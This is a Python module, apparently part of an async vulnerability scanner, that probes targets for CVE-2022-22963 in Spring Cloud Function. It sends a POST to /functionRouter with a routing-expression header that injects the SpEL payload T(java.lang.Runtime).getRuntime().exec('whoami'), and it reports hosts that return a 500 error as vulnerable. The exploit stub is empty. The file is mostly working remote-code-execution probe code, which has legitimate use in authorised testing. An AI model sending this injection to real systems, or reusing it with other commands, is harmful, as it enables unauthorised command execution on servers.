# coding:utf-8

import aiohttp
from util import RandomUA
from util.Translate import tr

class CVE_2022_22963_Async:
    def __init__(self):
        ua = RandomUA.RandomUA()
        self.ua = ua.UserAgent()
        self.payload = f'T(java.lang.Runtime).getRuntime().exec("whoami")'

        self.data = 'test'
        self.header = {
            'spring.cloud.function.routing-expression': self.payload,
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': self.ua,
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.path = 'functionRouter'

    async def fetch(self, session, url, headers, data, proxies):
        try:
            async with session.post(url=url, headers=headers, data=data, verify_ssl=False, proxies=proxies, timeout=6) as response:
                return await response.text(), response.status
        except Exception as e:
            return str(e), 0

    async def poc(self, url, proxies, ProxyStute):
        if ProxyStute == 1:
            proxy = proxies
        else:
            proxy = None
        try:
            self.url = url + self.path
            async with aiohttp.ClientSession() as session:
                text, code = await self.fetch(session, self.url, self.header, self.data, proxy)

                rsp = '"error":"Internal Server Error"'
                if code == 500 and rsp in text:
                    result = tr("v.22963.found_shell", url=url)
                    return result
                else:
                    result = tr("v.22963.none", url=url)
                    return result
        except Exception as e:
            error = tr("v.unknown", url=url, e=e)
            return error
    async def exp(self, url, proxies, ProxyStute):
        pass